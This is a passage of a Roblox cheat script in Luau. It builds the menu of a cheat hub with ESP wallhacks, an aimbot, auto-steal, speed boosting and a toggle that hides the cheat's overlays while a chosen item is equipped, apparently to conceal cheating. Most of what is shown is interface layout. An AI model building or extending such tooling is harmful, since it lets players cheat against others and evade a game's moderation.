		_G._DatShawnHideAllESP = false
		if not espSnapshot then return end
		State.ESP, State.BaseESP = espSnapshot.player, espSnapshot.base
		State.BrainrotESP, State.CloneESP, State.MineESP = espSnapshot.brainrot, espSnapshot.clone, espSnapshot.mine
		State.BearTrapESP = espSnapshot.bearTrap
		if State.ESP then enableESP() end
		if State.BaseESP then task.defer(refreshBaseESP) end
		espSnapshot = nil
	end

	local function setEverythingHidden(hidden)
		if hidden == hideApplied then return end
		hideApplied = hidden
		if hidden then
			turnOffESP()
			hideEveryGui()
		else
			disconnectGuiWatchers()
			for screenGui, wasEnabled in pairs(hiddenGuis) do
				if screenGui.Parent then pcall(function() screenGui.Enabled = wasEnabled end) end
			end
			table.clear(hiddenGuis)
			restoreESP()
		end
	end

	local function targetEquipped()
		local target = tostring(Settings.HideGUIItem or ""):lower()
		if target == "" then return false end
		local character = LP.Character
		if not character then return false end
		for _, child in ipairs(character:GetChildren()) do
			if child:IsA("Tool") and child.Name:lower() == target then return true end
		end
		return false
	end

	function P.refreshHideGUI()
		setEverythingHidden(State.HideGUI and targetEquipped())
	end

	function P.setHideGUI(on)
		State.HideGUI = on and true or false
		P.refreshHideGUI()
		saveSettings()
	end

	function P.setHideItem(text)
		Settings.HideGUIItem = tostring(text or "")
		P.refreshHideGUI()
		saveSettings()
	end

	local function hookCharacter(character)
		table.insert(Connections, character.ChildAdded:Connect(function(child)
			if child:IsA("Tool") then task.defer(P.refreshHideGUI) end
		end))
		table.insert(Connections, character.ChildRemoved:Connect(function(child)
			if child:IsA("Tool") then task.defer(P.refreshHideGUI) end
		end))
		task.defer(P.refreshHideGUI)
	end
	if LP.Character then hookCharacter(LP.Character) end
	table.insert(Connections, LP.CharacterAdded:Connect(hookCharacter))

	-- Keep the helper on the feature table instead of declaring another local
	-- function in this very large chunk. Volt/Luau has a 200-register limit.
	P._adminState = P._adminState or {}
	function P._findAdminButton()
		local left = PlayerGui:FindFirstChild("TopbarStandard", true)
		left = left and left:FindFirstChild("Left", true)
		if not left then return nil, nil end
		for _, child in ipairs(left:GetChildren()) do
			local name = child.Name:lower()
			local textObject = child:FindFirstChildWhichIsA("TextLabel", true)
			local text = textObject and textObject.Text:lower() or ""
			if name:find("admin", 1, true) or text:find("admin", 1, true) then return child, left end
		end
		return left:GetChildren()[4], left
	end

	function P.setHideAdmin(on)
		State.HideAdmin = on and true or false
		local adminState = P._adminState
		if State.HideAdmin then
			if not adminState.button or not adminState.button.Parent then adminState.button, adminState.parent = P._findAdminButton() end
			if adminState.button then pcall(function() adminState.button.Parent = nil end) end
			adminState.gui = PlayerGui:FindFirstChild("AdminPanel")
			if adminState.gui and adminState.gui:IsA("ScreenGui") then
				adminState.guiEnabled = adminState.gui.Enabled
				adminState.gui.Enabled = false
			end
		else
			if adminState.button and adminState.parent then pcall(function() adminState.button.Parent = adminState.parent end) end
			if adminState.gui and adminState.gui.Parent and adminState.guiEnabled ~= nil then pcall(function() adminState.gui.Enabled = adminState.guiEnabled end) end
		end
		saveSettings()
	end

	P.cleanup = function()
		setEverythingHidden(false)
		if State.HideAdmin then State.HideAdmin = false; P.setHideAdmin(false) end
	end
end

FC.BrainrotESPLabel = textLabel("Brainrot ESP", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.BrainrotESPKeyButton = button(Settings.BrainrotESPKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.BrainrotESPToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.CloneESPLabel = textLabel("Clone ESP", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.CloneESPKeyButton = button(Settings.CloneESPKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.CloneESPToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.MineESPLabel = textLabel("Mine ESP", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.MineESPKeyButton = button(Settings.MineESPKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.MineESPToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.BearTrapESPLabel = textLabel("Bear Trap ESP", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.BearTrapESPKeyButton = button(Settings.BearTrapESPKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.BearTrapESPToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.AntiTurretLabel = textLabel("Anti Turret", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.AntiTurretKeyButton = button(Settings.AntiTurretKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.AntiTurretToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.QuickPickupLabel = textLabel("Quick Pick Up", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.QuickPickupKeyButton = button(Settings.QuickPickupKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.QuickPickupToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.HideGUILabel = textLabel("Hide GUI", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.HideGUIItemBox = Instance.new("TextBox")
FC.HideGUIItemBox.BackgroundColor3 = Color3.fromRGB(31, 32, 40)
FC.HideGUIItemBox.Text = Settings.HideGUIItem or ""
FC.HideGUIItemBox.PlaceholderText = "item"
FC.HideGUIItemBox.TextColor3 = Color3.new(1, 1, 1)
FC.HideGUIItemBox.TextSize = 9
FC.HideGUIItemBox.Font = Enum.Font.FredokaOne
FC.HideGUIItemBox.ClearTextOnFocus = false
Instance.new("UICorner", FC.HideGUIItemBox).CornerRadius = UDim.new(0, 6)
FC.HideGUIKeyButton = button(Settings.HideGUIKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.HideGUIToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.GameOptimizerLabel = textLabel("Game Optimizer", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.GameOptimizerKeyButton = button(Settings.GameOptimizerKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.GameOptimizerToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.HideAdminLabel = textLabel("Hide Admin Panel", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.HideAdminKeyButton = button(Settings.HideAdminKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.HideAdminToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.AntiInverseLabel = textLabel("Anti Inverse / Bee", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.AntiInverseKeyButton = button(Settings.AntiInverseKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.AntiInverseToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
FC.AntiIntruderLabel = textLabel("Anti Intruder Alert", UDim2.new(), UDim2.fromOffset(170, 40), 11, true)
FC.AntiIntruderKeyButton = button(Settings.IntruderAlertKey.Name, UDim2.new(), UDim2.fromOffset(52, 28), Color3.fromRGB(50,115,155))
FC.AntiIntruderToggle = button("OFF", UDim2.new(), UDim2.fromOffset(50, 28))
end

local function placeHubRow(page, y, label, valueControl, keyControl, toggleControl)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, 40)
	row.Position = UDim2.fromOffset(0, y)
	row.BackgroundColor3 = Color3.fromRGB(23, 25, 34)
	row.BackgroundTransparency = 0.04
	row.BorderSizePixel = 0
	row.Parent = page
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 9)
	local rowStroke = Instance.new("UIStroke", row)
	rowStroke.Color = Color3.fromRGB(48, 52, 68)
	rowStroke.Transparency = 0.35
	rowStroke.Thickness = 0.8
	label.Parent = row
	label.Position = UDim2.fromOffset(11, 0)
	label.Size = UDim2.fromOffset(170, 40)
	label.TextSize = 11
	if valueControl then
		valueControl.Parent = row
		valueControl.Position = UDim2.fromOffset(184, 6)
		valueControl.Size = UDim2.fromOffset(56, 28)
	end
	if keyControl then
		keyControl.Parent = row
		keyControl.Position = UDim2.fromOffset(246, 6)
		keyControl.Size = UDim2.fromOffset(52, 28)
	end
	if toggleControl then
		toggleControl.Parent = row
		toggleControl.Position = UDim2.new(1, -58, 0, 6)
		toggleControl.Size = UDim2.fromOffset(50, 28)
	end
end

placeHubRow(MainPage, 0, AutoPotionLabel, nil, nil, AutoPotionToggle)
placeHubRow(MainPage, 46, Env.DatShawnPlayerBoosterLabel, nil, nil, Env.DatShawnPlayerBoosterOpenButton)
placeHubRow(MainPage, 92, JumpLabel, nil, JumpKeyButton, JumpToggle)

do
    local nearestLabel = textLabel("Auto Grab Nearest", UDim2.new(), UDim2.fromOffset(170,40), 11, true)
    local nearestButton = button("OFF", UDim2.new(), UDim2.fromOffset(50,28))
    local priorityLabel = textLabel("Auto Steal Priority", UDim2.new(), UDim2.fromOffset(170,40), 11, true)
    local priorityButton = button("OFF", UDim2.new(), UDim2.fromOffset(50,28))
    local carpetLabel = textLabel("Carpet Booster", UDim2.new(), UDim2.fromOffset(170,40), 11, true)
    local carpetButton = button("OFF", UDim2.new(), UDim2.fromOffset(50,28))
    placeHubRow(MainPage, 184, nearestLabel, nil, nil, nearestButton)
    placeHubRow(MainPage, 230, priorityLabel, nil, nil, priorityButton)
    placeHubRow(MainPage, 276, carpetLabel, nil, nil, carpetButton)
    Env.DatShawnGrabStateChanged = function(mode, enabled)
        local target = mode == "nearest" and nearestButton or priorityButton
        target.Text = enabled and "ON" or "OFF"
    end
    connect(nearestButton.MouseButton1Click, function()
        local api = Env.DatShawnGrabController
        if api then api.nearest(not api.nearestOn()) end
    end)
    connect(priorityButton.MouseButton1Click, function()
        local api = Env.DatShawnGrabController
        if api then api.priority(not api.priorityOn()) end
    end)
    connect(carpetButton.MouseButton1Click, function()
        if type(Env.DatShawnToggleCarpet) == "function" then Env.DatShawnToggleCarpet() end
    end)
    Env.DatShawnRefreshCarpetButton = function(on) carpetButton.Text = on and "ON" or "OFF" end
    Env.DatShawnRefreshCarpetButton(State.Carpet)
    Env.DatShawnCtrlNearestButton = nearestButton
    Env.DatShawnCtrlPriorityButton = priorityButton
    Env.DatShawnCtrlCarpetButton = carpetButton
end

do
local MountLabel = textLabel("Carpet Mount", UDim2.new(), UDim2.fromOffset(170,40),11,true)
local MountPicker = button("ANY", UDim2.new(), UDim2.fromOffset(150,28),Color3.fromRGB(52,64,105))
local mountOptions = {"Any", "Witch's Broom", "Cupid's Wings", "Waverider"}
local function updateMountPicker()
    MountPicker.Text = string.upper(Settings.CarpetMountChoice or "Any")
    Env.DatShawnMountChoiceDesired = Settings.CarpetMountChoice
    if type(Env.SabcomSetCarpetTool) == "function" then Env.SabcomSetCarpetTool(Settings.CarpetMountChoice) end
end
connect(MountPicker.MouseButton1Click, function()
    local index = table.find(mountOptions, Settings.CarpetMountChoice) or 1
    Settings.CarpetMountChoice = mountOptions[index % #mountOptions + 1]
    updateMountPicker()
    saveSettings()
end)
placeHubRow(MainPage, 138, MountLabel, nil, nil, MountPicker)
MountLabel.Size = UDim2.fromOffset(145,40)
MountPicker.Size = UDim2.fromOffset(152,28)
MountPicker.Position = UDim2.new(1,-158,0,6)
MountPicker.TextSize = 10
updateMountPicker()
Env.DatShawnCtrlMountPicker = MountPicker
end

placeHubRow(VisualPage, 0, ESPLabel, nil, nil, ESPToggle)
placeHubRow(VisualPage, 46, BaseESPLabel, nil, nil, BaseESPToggle)
placeHubRow(VisualPage, 92, Env.DatShawnFeatureControls.BrainrotESPLabel, nil, Env.DatShawnFeatureControls.BrainrotESPKeyButton, Env.DatShawnFeatureControls.BrainrotESPToggle)
placeHubRow(VisualPage, 138, Env.DatShawnFeatureControls.CloneESPLabel, nil, Env.DatShawnFeatureControls.CloneESPKeyButton, Env.DatShawnFeatureControls.CloneESPToggle)
placeHubRow(VisualPage, 184, Env.DatShawnFeatureControls.MineESPLabel, nil, Env.DatShawnFeatureControls.MineESPKeyButton, Env.DatShawnFeatureControls.MineESPToggle)
placeHubRow(VisualPage, 230, Env.DatShawnFeatureControls.BearTrapESPLabel, nil, Env.DatShawnFeatureControls.BearTrapESPKeyButton, Env.DatShawnFeatureControls.BearTrapESPToggle)
placeHubRow(VisualPage, 276, Env.DatShawnFeatureControls.HideGUILabel, Env.DatShawnFeatureControls.HideGUIItemBox, Env.DatShawnFeatureControls.HideGUIKeyButton, Env.DatShawnFeatureControls.HideGUIToggle)
placeHubRow(VisualPage, 322, Env.DatShawnFeatureControls.GameOptimizerLabel, nil, Env.DatShawnFeatureControls.GameOptimizerKeyButton, Env.DatShawnFeatureControls.GameOptimizerToggle)

-- Mirrors the exact replicated timer text on the player's active plot.
do
local MyBaseTimer = Instance.new("Frame")
MyBaseTimer.Name = ""
MyBaseTimer.Size = UDim2.fromOffset(190, 70)
MyBaseTimer.Position = Settings.MyBaseTimerPosition or UDim2.new(0.5,-95,0,100)
MyBaseTimer.BackgroundColor3 = Color3.fromRGB(20,22,37)
MyBaseTimer.BorderSizePixel = 0
MyBaseTimer.Active = true
MyBaseTimer.Draggable = not Settings.GlobalGuiLocked
MyBaseTimer.Visible = Settings.MyBaseTimerVisible == true
MyBaseTimer.Parent = GUI
Env.DatShawnApplyTimerLock = function(locked) MyBaseTimer.Draggable = not locked end
Instance.new("UICorner",MyBaseTimer).CornerRadius = UDim.new(0,10)
local timerTitle = Instance.new("TextLabel",MyBaseTimer)
timerTitle.Size = UDim2.new(1,-45,0,26)
timerTitle.Position = UDim2.fromOffset(10,3)
timerTitle.BackgroundTransparency = 1
timerTitle.Text = "MY BASE TIME"
timerTitle.TextColor3 = Color3.fromRGB(230,235,255)
timerTitle.Font = Enum.Font.GothamBold
timerTitle.TextSize = 11
timerTitle.TextXAlignment = Enum.TextXAlignment.Left
local timerValue = Instance.new("TextLabel",MyBaseTimer)
timerValue.Size = UDim2.new(1,-12,0,36)
timerValue.Position = UDim2.fromOffset(6,29)
timerValue.BackgroundTransparency = 1
timerValue.Text = "—"
timerValue.TextColor3 = Color3.fromRGB(180,200,255)
timerValue.Font = Enum.Font.GothamBold
timerValue.TextSize = 22
local TimerLabel = textLabel("My Base Time",UDim2.new(),UDim2.fromOffset(170,40),11,true)
local TimerToggle = button("OPEN",UDim2.new(),UDim2.fromOffset(50,28))
placeHubRow(VisualPage,368,TimerLabel,nil,nil,TimerToggle)
VisualPage.CanvasSize = UDim2.fromOffset(0,430)
local function showBaseTimer(value)
    MyBaseTimer.Visible = value
    Settings.MyBaseTimerVisible = value
    TimerToggle.Text = value and "CLOSE" or "OPEN"
    saveSettings()
end
connect(TimerToggle.MouseButton1Click,function() showBaseTimer(not MyBaseTimer.Visible) end)
connect(MyBaseTimer:GetPropertyChangedSignal("Position"),function()
    Settings.MyBaseTimerPosition = MyBaseTimer.Position
    saveSettings()
end)
local cachedPlot,cachedTimeLabel,elapsed,timeTextConnection = nil,nil,0,nil
local function updateTimerText()
    timerValue.Text = cachedTimeLabel and cachedTimeLabel.Text ~= "" and cachedTimeLabel.Text
        or (cachedPlot and "—" or "No base")
end
connect(RunService.Heartbeat,function(dt)
    if not MyBaseTimer.Visible then return end
    elapsed += dt
    if elapsed < 0.05 then return end
    elapsed = 0
    local plots = workspace:FindFirstChild("Plots")
    local mine = nil
    if plots then
        for _,plot in ipairs(plots:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            local yourBase = sign and sign:FindFirstChild("YourBase")
            if yourBase and yourBase.Enabled then mine = plot; break end
        end
    end
    if mine ~= cachedPlot or not cachedTimeLabel or not cachedTimeLabel.Parent then
        if timeTextConnection then timeTextConnection:Disconnect(); timeTextConnection = nil end
        cachedPlot,cachedTimeLabel = mine,nil
        if mine then
            for _,object in ipairs(mine:GetDescendants()) do
                if object.Name == "RemainingTime" and (object:IsA("TextLabel") or object:IsA("TextBox")) then
                    cachedTimeLabel = object
                    timeTextConnection = connect(object:GetPropertyChangedSignal("Text"), updateTimerText)
                    break
                end
            end
        end
    end
    updateTimerText()
end)
Env.DatShawnCtrlTimerToggle = TimerToggle

end

placeHubRow(PlayerPage, 0, AimbotLabel, nil, nil, AimbotToggle)
placeHubRow(PlayerPage, 46, AntiRagdollLabel, nil, AntiRagdollKeyButton, AntiRagdollToggle)
placeHubRow(PlayerPage, 92, Env.DatShawnFeatureControls.HideAdminLabel, nil, Env.DatShawnFeatureControls.HideAdminKeyButton, Env.DatShawnFeatureControls.HideAdminToggle)
placeHubRow(PlayerPage, 138, Env.DatShawnFeatureControls.AntiInverseLabel, nil, Env.DatShawnFeatureControls.AntiInverseKeyButton, Env.DatShawnFeatureControls.AntiInverseToggle)
placeHubRow(PlayerPage, 184, Env.DatShawnFeatureControls.AntiIntruderLabel, nil, Env.DatShawnFeatureControls.AntiIntruderKeyButton, Env.DatShawnFeatureControls.AntiIntruderToggle)

placeHubRow(UtilsPage, 0, Env.DatShawnFeatureControls.AntiTurretLabel, nil, Env.DatShawnFeatureControls.AntiTurretKeyButton, Env.DatShawnFeatureControls.AntiTurretToggle)
placeHubRow(UtilsPage, 46, Env.DatShawnFeatureControls.QuickPickupLabel, nil, Env.DatShawnFeatureControls.QuickPickupKeyButton, Env.DatShawnFeatureControls.QuickPickupToggle)
placeHubRow(UtilsPage, 92, TradeRegionLabel, nil, TradeRegionKeyButton, TradeRegionToggle)
placeHubRow(UtilsPage, 138, TradePlazaLabel, nil, TradePlazaKeyButton, TradePlazaToggle)
placeHubRow(UtilsPage, 184, ActionsPanelLabel, nil, nil, ActionsPanelToggle)
placeHubRow(UtilsPage, 230, QuickPanelLabel, nil, nil, QuickPanelToggle)
placeHubRow(UtilsPage, 276, APSpamLabel, nil, nil, APSpamToggle)
placeHubRow(UtilsPage, 322, XDSpamLabel, nil, nil, XDSpamToggle)
placeHubRow(UtilsPage, 368, DefensePanelLabel, nil, nil, DefensePanelToggle)
placeHubRow(UtilsPage, 414, CooldownPanelLabel, nil, nil, CooldownPanelToggle)

-- Search every existing Ctrl-panel row without cloning controls or their callbacks.
do
local searchBox = Instance.new("TextBox")
searchBox.Name = "HubFeatureSearch"
Env.DatShawnSearchBox = searchBox
searchBox.Size = UDim2.new(1, -28, 0, 33)
searchBox.Position = UDim2.fromOffset(14, 90)
searchBox.PlaceholderText = "Search every feature or panel..."
searchBox.Text = ""
searchBox.ClearTextOnFocus = false
searchBox.TextColor3 = Color3.fromRGB(245,245,250)
searchBox.PlaceholderColor3 = Color3.fromRGB(155,157,175)
searchBox.BackgroundColor3 = Color3.fromRGB(27,29,43)
searchBox.Font = Enum.Font.Gotham
searchBox.TextSize = 13
searchBox.TextXAlignment = Enum.TextXAlignment.Left
searchBox.Parent = Main
Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 9)
local searchPad = Instance.new("UIPadding", searchBox)
searchPad.PaddingLeft = UDim.new(0, 12)
PageHolder.Position = UDim2.fromOffset(14, 132)
PageHolder.Size = UDim2.new(1, -28, 0, 250)
local indexedRows = {}
for _, entry in ipairs({{MainPage,"Main"}, {VisualPage,"Visual"}, {PlayerPage,"Player"}, {UtilsPage,"Utils"}}) do
    for _, row in ipairs(entry[1]:GetChildren()) do
        if row:IsA("Frame") then
            local label = row:FindFirstChildWhichIsA("TextLabel")
            if label then
                table.insert(indexedRows, {row=row, page=entry[1], position=row.Position,
                    label=label.Text, category=entry[2]})
            end
        end
    end
end
local function filterHubRows()
    -- Add rows created later by isolated panel modules, such as Allow Base.
    for _, entry in ipairs({{MainPage,"Main"}, {VisualPage,"Visual"}, {PlayerPage,"Player"}, {UtilsPage,"Utils"}}) do
        for _, row in ipairs(entry[1]:GetChildren()) do
            if row:IsA("Frame") then
                local known = false
                for _, item in ipairs(indexedRows) do if item.row == row then known = true; break end end
                if not known then
                    local label = row:FindFirstChildWhichIsA("TextLabel")
                    if label then
                        table.insert(indexedRows,{row=row,page=entry[1],position=row.Position,
                            label=label.Text,category=entry[2]})
                    end
                end
            end
        end
    end
    local query = searchBox.Text:lower():gsub("^%s+", ""):gsub("%s+$", "")
    local matching = 0
    for _, item in ipairs(indexedRows) do
        local found = query ~= "" and (item.label:lower():find(query,1,true)
            or item.category:lower():find(query,1,true))
        if found then
            item.row.Parent = MainPage
            item.row.Position = UDim2.fromOffset(0, matching * 46)
            matching += 1
        else
            item.row.Parent = item.page
            item.row.Position = item.position
        end
        item.row.Visible = (query == "" or found or item.page ~= MainPage)
    end
    MainPage.CanvasSize = UDim2.fromOffset(0, query ~= "" and math.max(250,matching*46) or 340)
    if query ~= "" then MainPage.CanvasPosition = Vector2.zero end
end
connect(searchBox:GetPropertyChangedSignal("Text"), function()
    filterHubRows()
    if searchBox.Text ~= "" and type(Env.DatShawnSelectHubTab) == "function" then Env.DatShawnSelectHubTab("Main") end
end)
end


-- Carpet Speed lives beneath Instant Reset in the Actions Panel. Reuse the
-- existing speed box, keybind button, and animated toggle so all settings and
-- handlers remain unchanged.
task.defer(function()
	if not ActionsPanel or not ActionsPanel.Parent then return end
	local row = Instance.new("Frame")
	row.Name = "CarpetSpeedActionRow"
	row.Size = UDim2.new(1, -20, 0, 36)
	row.Position = UDim2.fromOffset(10, 248)
	row.BackgroundColor3 = Color3.fromRGB(29, 23, 46)
	row.BorderSizePixel = 0
	row.Parent = ActionsPanel
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
	CarpetLabel.Parent = row
	CarpetLabel.Position = UDim2.fromOffset(9, 0)
	CarpetLabel.Size = UDim2.fromOffset(88, 36)
	CarpetLabel.TextSize = 9
	CarpetBox.Parent = row
	CarpetBox.Position = UDim2.fromOffset(99, 5)
	CarpetBox.Size = UDim2.fromOffset(48, 26)
	CarpetKeyButton.Parent = row
	CarpetKeyButton.Position = UDim2.fromOffset(152, 5)
	CarpetKeyButton.Size = UDim2.fromOffset(45, 26)
	CarpetToggle.Parent = row
	CarpetToggle.Position = UDim2.new(1, -58, 0, 5)
	CarpetToggle.Size = UDim2.fromOffset(50, 26)
end)

local function selectHubTab(name)
	if Env.DatShawnSearchBox then
        if name ~= "Main" and Env.DatShawnSearchBox.Text ~= "" then Env.DatShawnSearchBox.Text = "" end
        Env.DatShawnSearchBox.Visible = name == "Main"
    end
	PageHolder.Position = UDim2.fromOffset(14, name == "Main" and 132 or 90)
	PageHolder.Size = UDim2.new(1, -28, 0, name == "Main" and 250 or 292)
	for pageName, data in pairs(Pages) do
		data.Frame.Visible = pageName == name
		if pageName == name then
			data.Scale.Scale = 0.94
			TweenService:Create(data.Scale, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
		end
	end
	for tabName, tab in pairs(TabButtons) do
		local selected = tabName == name
		TweenService:Create(tab, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundColor3 = selected and Color3.fromRGB(91, 75, 190) or Color3.fromRGB(30, 32, 43),
			TextColor3 = selected and Color3.new(1, 1, 1) or Color3.fromRGB(155, 160, 180),
		}):Play()
	end
end

Env.DatShawnSelectHubTab = selectHubTab
for _, tabName in ipairs({"Main", "Visual", "Player", "Utils"}) do
	local selectedTabName = tabName
	local tab = Instance.new("TextButton")
	tab.Size = UDim2.fromOffset(86, 32)
	tab.BackgroundColor3 = Color3.fromRGB(30, 32, 43)
	tab.Text = tabName:upper()
	tab.TextColor3 = Color3.fromRGB(155, 160, 180)
	tab.TextSize = 10
	tab.Font = Enum.Font.FredokaOne
	tab.AutoButtonColor = false
	tab.Parent = TabBar
	Instance.new("UICorner", tab).CornerRadius = UDim.new(0, 8)
	TabButtons[selectedTabName] = tab
	connect(tab.MouseButton1Click, function() selectHubTab(selectedTabName) end)
end
selectHubTab("Main")

-- Compact movable Regular/Giant booster controller.
BoosterMini = Instance.new("Frame")
BoosterMini.Name = "BoosterMini"
BoosterMini.Size = UDim2.fromOffset(306, 106)
BoosterMini.Position = Settings.BoosterMiniPosition
BoosterMini.BackgroundColor3 = Color3.fromRGB(15, 13, 25)
BoosterMini.BorderSizePixel = 0
BoosterMini.Active = true
BoosterMini.Draggable = not Settings.GlobalGuiLocked
BoosterMini.Visible = (function()
	if typeof(isfile) == "function" and typeof(readfile) == "function" and isfile("DatShawn_BoosterPanel.txt") then
		local ok, value = pcall(readfile, "DatShawn_BoosterPanel.txt")
		return ok and value == "1"
	end
	return false
end)()
BoosterMini.Parent = GUI
Instance.new("UICorner", BoosterMini).CornerRadius = UDim.new(0, 10)
local boosterStroke = Instance.new("UIStroke", BoosterMini)
boosterStroke.Color = Color3.fromRGB(105, 85, 225)
boosterStroke.Thickness = 1.2

local BoosterTitle = Instance.new("TextLabel")
BoosterTitle.Size = UDim2.fromOffset(210, 24)
BoosterTitle.Position = UDim2.fromOffset(9, 4)
BoosterTitle.BackgroundTransparency = 1
BoosterTitle.Text = "DATSHAWN PLAYER BOOSTER"
BoosterTitle.TextColor3 = Color3.fromRGB(235, 235, 245)
BoosterTitle.TextSize = 11
BoosterTitle.Font = Enum.Font.FredokaOne
BoosterTitle.TextXAlignment = Enum.TextXAlignment.Left
BoosterTitle.Parent = BoosterMini

local function boosterMiniButton(text, position, size)
	local object = Instance.new("TextButton")
	object.Size = size
	object.Position = position
	object.BackgroundColor3 = Color3.fromRGB(48, 39, 66)
	object.Text = text
	object.TextColor3 = Color3.fromRGB(240, 240, 248)
	object.TextSize = 9
	object.Font = Enum.Font.FredokaOne
	object.Parent = BoosterMini
	Instance.new("UICorner", object).CornerRadius = UDim.new(0, 5)
	return object
end

local BoosterRegularToggle = boosterMiniButton("BOOST OFF", UDim2.fromOffset(10, 34), UDim2.fromOffset(142, 28))
local BoosterRegularKey = boosterMiniButton(RegularKey.Name, UDim2.fromOffset(226, 34), UDim2.fromOffset(70, 28))
local BoosterGiantToggle = boosterMiniButton("GIANT POTION SPEED", UDim2.fromOffset(10, 68), UDim2.fromOffset(142, 28))
local BoosterGiantKey = boosterMiniButton(GiantKey.Name, UDim2.fromOffset(226, 68), UDim2.fromOffset(70, 28))
BoosterGiantToggle.Visible = true
BoosterGiantKey.Visible = true
-- Reuse the existing validated decimal TextBoxes so their filtering, clamping,
-- saving, and live speed behavior stay attached to the new panel.
for _, data in ipairs({
	{Box = RegularBox, Y = 34},
	{Box = GiantBox, Y = 68},
}) do
	data.Box.Parent = BoosterMini
	data.Box.Visible = true
	data.Box.Position = UDim2.fromOffset(160, data.Y)
	data.Box.Size = UDim2.fromOffset(60, 28)
	data.Box.TextXAlignment = Enum.TextXAlignment.Center
	data.Box.BackgroundColor3 = Color3.fromRGB(26, 26, 31)
	local speedStroke = data.Box:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke", data.Box)
	speedStroke.Color = Color3.fromRGB(100, 100, 112)
	speedStroke.Transparency = 0.25
	speedStroke.Thickness = 0.8
end

-- These older duplicate controls are no longer shown in the Ctrl panel.
RegularLabel.Visible = false
RegularKeyButton.Visible = false
RegularToggle.Visible = false
GiantLabel.Visible = false
GiantKeyButton.Visible = false
GiantToggle.Visible = false

Env.DatShawnSetPlayerBoosterVisible = function(visible)
	BoosterMini.Visible = visible == true
	Env.DatShawnPlayerBoosterOpenButton.Text = BoosterMini.Visible and "CLOSE" or "OPEN"
	Env.DatShawnPlayerBoosterOpenButton.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	if typeof(writefile) == "function" then pcall(writefile, "DatShawn_BoosterPanel.txt", BoosterMini.Visible and "1" or "0") end
end
connect(Env.DatShawnPlayerBoosterOpenButton.MouseButton1Click, function()
	Env.DatShawnSetPlayerBoosterVisible(not BoosterMini.Visible)
end)
Env.DatShawnSetPlayerBoosterVisible(BoosterMini.Visible)

local function paintBoosterSwitch(object, labelText, enabled, activeColor)
	object.Text = ""
	object.BackgroundColor3 = Color3.fromRGB(39, 31, 55)
	local label = object:FindFirstChild("SwitchLabel")
	if not label then
		label = Instance.new("TextLabel")
		label.Name = "SwitchLabel"
		label.Size = UDim2.new(1, -55, 1, 0)
		label.Position = UDim2.fromOffset(8, 0)
		label.BackgroundTransparency = 1
		label.TextColor3 = Color3.fromRGB(240, 240, 248)
		label.TextSize = 9
		label.Font = Enum.Font.FredokaOne
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Active = false
		label.Parent = object
	end
	label.Text = labelText
	label.TextSize = labelText == "GIANT POTION SPEED" and 8 or 9
	local track = object:FindFirstChild("MiniTrack")
	if not track then
		track = Instance.new("Frame")
		track.Name = "MiniTrack"
		track.Size = UDim2.fromOffset(40, 18)
		track.Position = UDim2.new(1, -45, 0.5, -9)
		track.BorderSizePixel = 0
		track.Active = false
		track.Parent = object
		Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
		local knob = Instance.new("Frame")
		knob.Name = "Knob"
		knob.Size = UDim2.fromOffset(14, 14)
		knob.Position = UDim2.fromOffset(2, 2)
		knob.BackgroundColor3 = Color3.fromRGB(248, 250, 255)
		knob.BorderSizePixel = 0
		knob.Active = false
		knob.Parent = track
		Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
	end
	local knob = track:FindFirstChild("Knob")
	TweenService:Create(track, TweenInfo.new(0.2), {BackgroundColor3 = enabled and activeColor or Color3.fromRGB(70, 72, 85)}):Play()
	TweenService:Create(knob, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
